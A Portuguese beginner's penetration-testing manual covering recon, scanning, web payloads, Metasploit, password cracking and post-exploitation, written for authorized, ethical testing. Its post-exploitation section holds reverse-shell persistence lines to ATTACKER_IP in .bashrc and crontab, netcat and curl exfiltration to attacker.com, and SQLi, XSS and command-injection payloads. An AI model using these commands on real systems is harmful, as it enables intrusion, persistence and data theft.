# Manual Completo para Pentester Iniciante

## Índice
1. [Introdução ao Pentesting](#introdução-ao-pentesting)
2. [Preparação do Ambiente](#preparação-do-ambiente)
3. [Reconhecimento (Information Gathering)](#reconhecimento-information-gathering)
4. [Escaneamento e Enumeração](#escaneamento-e-enumeração)
5. [Análise de Vulnerabilidades](#análise-de-vulnerabilidades)
6. [Exploração (Exploitation)](#exploração-exploitation)
7. [Pós-Exploração](#pós-exploração)
8. [Relatórios e Documentação](#relatórios-e-documentação)
9. [Ferramentas Essenciais](#ferramentas-essenciais)
10. [Metodologias e Frameworks](#metodologias-e-frameworks)
11. [Legalidade e Ética](#legalidade-e-ética)
12. [Certificações e Carreira](#certificações-e-carreira)

---

## Introdução ao Pentesting

### O que é Pentesting?
**Penetration Testing** (Teste de Penetração) é uma prática autorizada de simular ataques cibernéticos em sistemas para identificar vulnerabilidades antes que atacantes mal-intencionados possam explorá-las.

### Tipos de Pentesting
1. **Black Box**: Testador não tem conhecimento interno do sistema
2. **White Box**: Testador tem conhecimento completo do sistema
3. **Gray Box**: Conhecimento parcial do sistema
4. **Red Team**: Simulação de ataque realista
5. **Blue Team**: Defesa contra ataques
6. **Purple Team**: Colaboração entre Red e Blue Teams

### Ciclo de Vida do Pentesting
```
1. Planejamento e Autorização
2. Reconhecimento (Reconnaissance)
3. Escaneamento (Scanning)
4. Acesso (Gaining Access)
5. Manutenção de Acesso (Maintaining Access)
6. Análise e Relatório
```

### Princípios Éticos
- **Autorização por escrito** sempre
- **Confidencialidade** dos dados
- **Não causar danos** aos sistemas
- **Documentação precisa** dos achados

---

## Preparação do Ambiente

### Distribuições Linux para Pentesting
```bash
# Kali Linux (Mais popular)
# Parrot OS (Leve e completo)
# BlackArch (Focado em Arch Linux)
# BackBox (Baseado no Ubuntu)
```

### Configuração do Kali Linux
```bash
# Atualização do sistema
sudo apt update && sudo apt upgrade -y
sudo apt dist-upgrade -y

# Instalação de ferramentas essenciais
sudo apt install -y git curl wget nmap hydra john wireshark
sudo apt install -y metasploit-framework burpsuite sqlmap

# Configuração de serviços
sudo systemctl start postgresql
sudo systemctl enable postgresql
sudo msfdb init
```

### Máquinas Virtuais e Laboratórios
```bash
# Ferramentas recomendadas
- VirtualBox ou VMware
- Docker para containers
- Vagrant para ambientes automatizados

# Laboratórios gratuitos
- TryHackMe (https://tryhackme.com)
- HackTheBox (https://hackthebox.com)
- VulnHub (https://www.vulnhub.com)
- PentesterLab (https://pentesterlab.com)
```

### Configuração de VPN para Pentesting
```bash
# OpenVPN no Kali
sudo apt install openvpn
sudo openvpn config.ovpn

# WireGuard
sudo apt install wireguard
wg-quick up wg0
```

---

## Reconhecimento (Information Gathering)

### Coleta de Informações Públicas (OSINT)
```bash
# Google Dorks
site:example.com filetype:pdf
inurl:admin site:example.com
intitle:"index of" "parent directory"

# theHarvester - Coleta emails, subdomínios
theharvester -d example.com -b google
theharvester -d example.com -l 500 -b all

# recon-ng - Framework de reconhecimento
recon-ng
marketplace install all
modules load recon/domains-hosts/brute_hosts
```

### Enumeração de Subdomínios
```bash
# Sublist3r
python3 sublist3r.py -d example.com

# amass
amass enum -d example.com

# assetfinder
assetfinder --subs-only example.com

# dnsrecon
dnsrecon -d example.com -t std
```

### Coleta de Informações do Alvo
```bash
# whois
whois example.com

# nslookup
nslookup example.com
nslookup -type=MX example.com

# dig
dig example.com ANY
dig example.com MX
dig example.com TXT

# shodan (API necessária)
shodan host 8.8.8.8
```

### Identificação de Tecnologias
```bash
# whatweb
whatweb example.com
whatweb -a 3 example.com

# wappalyzer (extensão navegador)
# builtwith.com (site)

# httpx
httpx -u https://example.com -title -status-code -tech-detect
```

---

## Escaneamento e Enumeração

### Escaneamento de Portas com Nmap
```bash
# Scan básico
nmap -sV -sC example.com

# Scan completo
nmap -p- -sV -sC -O -T4 example.com

# Scan stealth (SYN)
nmap -sS -p 1-1000 example.com

# Scan UDP
nmap -sU -p 1-100 example.com

# Scripts específicos
nmap --script vuln example.com
nmap --script smb-enum-shares.nse -p445 example.com

# Salvar resultados
nmap -oN scan.txt -oX scan.xml -oG scan.gnmap example.com
```

### Enumeração de Serviços

#### HTTP/HTTPS
```bash
# Nikto
nikto -h https://example.com

# dirb/dirbuster/gobuster
gobuster dir -u https://example.com -w /usr/share/wordlists/dirb/common.txt
gobuster vhost -u https://example.com -w subdomains.txt

# ffuf
ffuf -u https://example.com/FUZZ -w wordlist.txt
ffuf -u https://example.com -H "Host: FUZZ.example.com" -w subdomains.txt

# wfuzz
wfuzz -c -z file,wordlist.txt --hc 404 https://example.com/FUZZ
```

#### SMB (Windows Shares)
```bash
# enum4linux
enum4linux -a 192.168.1.100

# smbclient
smbclient -L //192.168.1.100/
smbclient //192.168.1.100/share

# nmap scripts
nmap --script smb-enum-shares.nse -p445 192.168.1.100
```

#### FTP
```bash
# Conexão básica
ftp 192.168.1.100

# Nmap scripts
nmap --script ftp-anon.nse -p21 192.168.1.100
```

#### SSH
```bash
# Banner grabbing
nc 192.168.1.100 22

# Enumeração de chaves
ssh-keyscan 192.168.1.100
```

### Análise de Certificados SSL
```bash
# sslscan
sslscan example.com:443

# testssl.sh
./testssl.sh https://example.com

# openssl
openssl s_client -connect example.com:443
```

---

## Análise de Vulnerabilidades

### Scanners Automatizados
```bash
# Nessus (comercial)
# OpenVAS (open source)
sudo gvm-setup
sudo gvm-start

# nikto (web)
nikto -h https://example.com -output nikto.txt

# wpscan (WordPress)
wpscan --url https://example.com --enumerate vp,u
```

### Análise Manual de Aplicações Web

#### SQL Injection
```sql
' OR '1'='1
' UNION SELECT 1,2,3--
' AND 1=2 UNION SELECT 1,2,3--
```

#### XSS (Cross-Site Scripting)
```html
<script>alert('XSS')</script>
<img src=x onerror=alert('XSS')>
"><script>alert('XSS')</script>
```

#### Command Injection
```bash
; ls -la
| cat /etc/passwd
`whoami`
$(id)
```

### Ferramentas de Análise
```bash
# sqlmap
sqlmap -u "https://example.com/page?id=1" --dbs
sqlmap -u "https://example.com/page?id=1" -D database --tables
sqlmap -u "https://example.com/page?id=1" -D database -T users --dump

# commix (command injection)
commix -u "https://example.com/cmd.php?cmd=whoami"

# xsstrike
python3 xsstrike.py -u "https://example.com/search?q=test"
```

---

## Exploração (Exploitation)

### Metasploit Framework
```bash
# Iniciar Metasploit
sudo msfconsole

# Comandos básicos
search exploit eternalblue
use exploit/windows/smb/ms17_010_eternalblue
show options
set RHOSTS 192.168.1.100
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.1.50
exploit

# Meterpreter commands
sysinfo
getuid
shell
upload /local/path /remote/path
download /remote/path /local/path
```

### Exploração Manual
```python
# Exemplo: Buffer Overflow básico
#!/usr/bin/python3
import socket
import sys

host = "192.168.1.100"
port = 9999

buffer = b"A" * 2000

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, port))
s.send(buffer)
s.close()
```

### Exploração Web
```bash
# File Upload Bypass
# Tente diferentes extensões:
shell.php.jpg
shell.php%00.jpg
shell.pHp

# LFI (Local File Inclusion)
https://example.com/page?file=../../../../etc/passwd
https://example.com/page?file=php://filter/convert.base64-encode/resource=index.php

# RFI (Remote File Inclusion)
https://example.com/page?file=http://attacker.com/shell.txt
```

### Password Attacks
```bash
# hydra (brute force)
hydra -l admin -P passwords.txt ssh://192.168.1.100
hydra -L users.txt -P pass.txt http://example.com/login

# john (password cracking)
john --wordlist=rockyou.txt hash.txt
john --format=nt hash.txt

# hashcat
hashcat -m 0 -a 0 hash.txt rockyou.txt
hashcat -m 1000 hash.txt --show
```

---

## Pós-Exploração

### Escalação de Privilégios (Linux)
```bash
# Comandos para enumeração
id
sudo -l
find / -perm -u=s -type f 2>/dev/null
find / -writable 2>/dev/null
cat /etc/passwd
cat /etc/shadow

# Exploits comuns
# https://github.com/carlospolop/PEASS-ng
# LinPEAS.sh (automático)
```

### Escalação de Privilégios (Windows)
```powershell
# Comandos básicos
whoami /priv
systeminfo
net user
net localgroup administrators

# Ferramentas recomendadas
# WinPEAS.exe
# PowerUp.ps1 (PowerSploit)
# Seatbelt.exe
```

### Movimento Lateral
```bash
# Pass the Hash (Windows)
pth-winexe -U administrator%hash //192.168.1.100 cmd

# SSH Key Abuse
cat ~/.ssh/id_rsa.pub >> ~/.ssh/authorized_keys

# Dumping de Credenciais
# mimikatz (Windows)
# LaZagne (Multi-plataforma)
```

### Persistência
```bash
# Linux
echo "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1" >> ~/.bashrc
crontab -e
# Adicionar: */5 * * * * /bin/bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'

# Windows
# Registry Run Keys
# Scheduled Tasks
# Service Installation
```

### Exfiltração de Dados
```bash
# Comprimir dados
tar czf data.tar.gz /important/files/

# Transferência via netcat
# Atacante: nc -lvp 4444 > data.tar.gz
# Alvo: nc ATTACKER_IP 4444 < data.tar.gz

# Via web
curl -X POST -F "file=@data.tar.gz" https://attacker.com/upload

# DNS exfiltration (stealth)
# Usar ferramentas como dnscat2
```

---

## Relatórios e Documentação

### Estrutura do Relatório
```
1. CAPA
   - Título
   - Cliente
   - Data
   - Confidencialidade

2. RESUMO EXECUTIVO
   - Objetivos
   - Escopo
   - Período
   - Principais achados
   - Recomendações prioritárias

3. METODOLOGIA
   - Abordagem utilizada
   - Ferramentas
   - Padrões seguidos

4. DETALHAMENTO TÉCNICO
   - Vulnerabilidades encontradas
   - CVSS Score
   - Evidências (screenshots, logs)
   - Passos para reprodução

5. CONCLUSÃO E RECOMENDAÇÕES
   - Resumo geral
   - Plano de remediação
   - Referências

6. APÊNDICES
   - Comandos utilizados
   - Logs completos
```

### Ferramentas para Relatórios
```bash
# Dradis Framework
sudo apt install dradis

# Serpico
# Faraday
```

### Exemplo de Vulnerabilidade no Relatório
```
Título: SQL Injection em /search.php
ID: VULN-001
Severidade: Crítica (CVSS: 9.8)
Descrição: Parametro "q" vulnerável a SQL Injection
Evidência:
  URL: https://example.com/search.php?q=test'
  Payload: ' UNION SELECT 1,2,3--
  Resultado: Colunas 2 e 3 retornadas na página
Impacto: Acesso a banco de dados completo
Recomendação: Usar prepared statements
```

---

## Ferramentas Essenciais

### Categorizadas por Função

#### Reconhecimento
```bash
# theHarvester, recon-ng, Maltego
# sublist3r, amass, assetfinder
# shodan, censys, foca
```

#### Escaneamento
```bash
# nmap, masscan, unicornscan
# nikto, wpscan, joomscan
# OpenVAS, Nessus, nexpose
```

#### Exploração
```bash
# Metasploit, searchsploit
# sqlmap, commix, xsstrike
# burpsuite, zaproxy, beef
```

#### Pós-Exploração
```bash
# meterpreter, empire, covenant
# mimikatz, LaZagne, hashcat
# john, hydra, medusa
```

#### Análise de Rede
```bash
# wireshark, tcpdump
# netcat, socat
# responder, impacket
```

#### Desenvolvimento
```bash
# python3, gcc, gdb
# radare2, ghidra
# pwntools, ropper
```

### Instalação Rápida de Ferramentas
```bash
#!/bin/bash
# Script de instalação para Kali

echo "[+] Instalando ferramentas essenciais..."
sudo apt update

# Ferramentas básicas
sudo apt install -y git curl wget nano vim tmux htop

# Rede
sudo apt install -y nmap masscan netcat wireshark tcpdump

# Web
sudo apt install -y gobuster dirb nikto sqlmap wpscan

# Exploração
sudo apt install -y metasploit-framework john hydra hashcat

# Desenvolvimento
sudo apt install -y python3 python3-pip gcc gdb

# Úteis
sudo apt install -y seclists wordlists
```

---

## Metodologias e Frameworks

### OWASP Testing Guide
```
A1: Broken Access Control
A2: Cryptographic Failures
A3: Injection
A4: Insecure Design
A5: Security Misconfiguration
A6: Vulnerable and Outdated Components
A7: Identification and Authentication Failures
A8: Software and Data Integrity Failures
A9: Security Logging and Monitoring Failures
A10: Server-Side Request Forgery
```

### PTES (Penetration Testing Execution Standard)
```
1. Pre-engagement Interactions
2. Intelligence Gathering
3. Threat Modeling
4. Vulnerability Analysis
5. Exploitation
6. Post-Exploitation
7. Reporting
```

### MITRE ATT&CK Framework
```bash
# Táticas comuns
TA0001: Initial Access
TA0002: Execution
TA0003: Persistence
TA0004: Privilege Escalation
TA0005: Defense Evasion
TA0006: Credential Access
TA0007: Discovery
TA0008: Lateral Movement
TA0009: Collection
TA0011: Exfiltration
TA0010: Command and Control
```

### Checklists para Pentesting
```bash
# Checklist Web
[ ] SQL Injection
[ ] XSS
[ ] CSRF
[ ] File Upload
[ ] IDOR
[ ] SSRF
[ ] XXE
[ ] SSTI
[ ] Logic Flaws

# Checklist Infraestrutura
[ ] Portas abertas
[ ] Serviços desatualizados
[ ] Configurações padrão
[ ] Senhas fracas
[ ] SNMP público
[ ] SMB anônimo
[ ] FTP anônimo
```

---

## Legalidade e Ética

### Documentos Essenciais
```
1. Termo de Autorização (Scope)
2. NDA (Acordo de Confidencialidade)
3. Plano de Teste
4. Plano de Comunicação
5. Plano de Resposta a Incidentes
```

### Leis e Regulamentos Importantes
```
- GDPR (Europa)
- LGPD (Brasil)
- HIPAA (Saúde - EUA)
- PCI-DSS (Pagamentos)
- ISO 27001
```

### Boas Práticas Éticas
```bash
1. SEMPRE obter autorização por escrito
2. Definir escopo claramente
3. Não causar interrupção de serviços
4. Não acessar dados não autorizados
5. Reportar vulnerabilidades responsavelmente
6. Manter confidencialidade dos dados
7. Documentar tudo com precisão
```

### Bug Bounty Programs
```bash
# Plataformas populares
- HackerOne
- Bugcrowd
- Open Bug Bounty
- Intigriti

# Regras gerais
1. Siga as regras do programa
2. Não realize ataques DoS/DDoS
3. Não comprometa dados de outros usuários
4. Reporte imediatamente após encontrar
5. Espere a resposta antes de publicar
```

---

## Certificações e Carreira

### Certificações Iniciantes
```
1. CompTIA Security+
2. CEH (Certified Ethical Hacker)
3. eJPT (eLearnSecurity Junior Penetration Tester)
4. PNPT (Practical Network Penetration Tester)
```

### Certificações Intermediárias
```
1. OSCP (Offensive Security Certified Professional)
2. GPEN (GIAC Penetration Tester)
3. CRTP (Certified Red Team Professional)
4. CPTS (Certified Penetration Testing Specialist)
```

### Certificações Avançadas
```
1. OSEP (Offensive Security Experienced Penetration Tester)
2. OSWE (Offensive Security Web Expert)
3. OSEE (Offensive Security Exploitation Expert)
4. GXPN (GIAC Exploit Researcher and Advanced Penetration Tester)
```

### Roadmap de Aprendizado
```
Mês 1-3: Fundamentos
  - Linux básico
  - Rede TCP/IP
  - Comandos essenciais
  - Laboratórios básicos

Mês 4-6: Web Application
  - OWASP Top 10
  - Burp Suite
  - Ferramentas web
  - CTFs web

Mês 7-9: Network Pentesting
  - Nmap avançado
  - Metasploit
  - Escalação de privilégios
  - Pós-exploração

Mês 10-12: Preparação para certificação
  - OSCP labs
  - Relatórios
  - Metodologias
  - Prática contínua
```

### Recursos Gratuitos
```
# Canais YouTube
- IppSec
- John Hammond
- NetworkChuck
- The Cyber Mentor

# Sites de Aprendizado
- TryHackMe
- HackTheBox Academy
- PentesterLab
- OverTheWire

# Blogs e Fóruns
- Medium (infosec writeups)
- Reddit r/netsec, r/HowToHack
- Exploit-DB
- Security Weekly
```

### Construindo um Portfólio
```bash
1. Write-ups de máquinas do HTB/THM
2. Projetos GitHub
3. Blog técnico
4. Contribuições open source
5. Bug bounty reports (se permitido)
```

---

## Glossário de Termos

```bash
APT: Advanced Persistent Threat
C2: Command and Control
CVE: Common Vulnerabilities and Exposures
CVSS: Common Vulnerability Scoring System
DoS: Denial of Service
IDS: Intrusion Detection System
IPS: Intrusion Prevention System
LFI: Local File Inclusion
RFI: Remote File Inclusion
RCE: Remote Code Execution
SIEM: Security Information and Event Management
SSRF: Server-Side Request Forgery
XSS: Cross-Site Scripting
XXE: XML External Entity
```

---

## Checklists Rápidas

### Antes do Teste
```
[ ] Autorização por escrito
[ ] Escopo definido
[ ] Contatos de emergência
[ ] Backup dos sistemas
[ ] Hora de início/fim acordada
```

### Durante o Teste
```
[ ] Documentar comandos executados
[ ] Salvar evidências (screenshots, logs)
[ ] Comunicar descobertas críticas
[ ] Seguir escopo definido
[ ] Não causar danos
```

### Após o Teste
```
[ ] Limpar shells/backdoors
[ ] Restaurar configurações se necessário
[ ] Compilar evidências
[ ] Escrever relatório
[ ] Reunião de debriefing
```

---

## Dicas Finais para Iniciantes

1. **Comece pelo básico**: Domine Linux, redes e protocolos
2. **Pratique constantemente**: Use laboratórios como HTB e TryHackMe
3. **Documente tudo**: Anote comandos, erros e soluções
4. **Participe da comunidade**: Forums, Discord, eventos
5. **Especialize-se gradualmente**: Web, mobile, cloud, IoT
6. **Mantenha-se atualizado**: Novas vulnerabilities surgem diariamente
7. **Pense como defensor**: Entenda como as defesas funcionam
8. **Seja ético**: Sua reputação é seu maior ativo
9. **Não tenha pressa**: Leva tempo para desenvolver habilidades
10. **Divirta-se**: Pentesting é desafiador mas recompensador

---

*Nota: Este manual é para fins educacionais. Sempre obtenha autorização por escrito antes de testar qualquer sistema. Use este conhecimento apenas para proteger sistemas e com intenções éticas.*

**"Com grandes poderes vêm grandes responsabilidades" - Tio Ben (Homem-Aranha)**
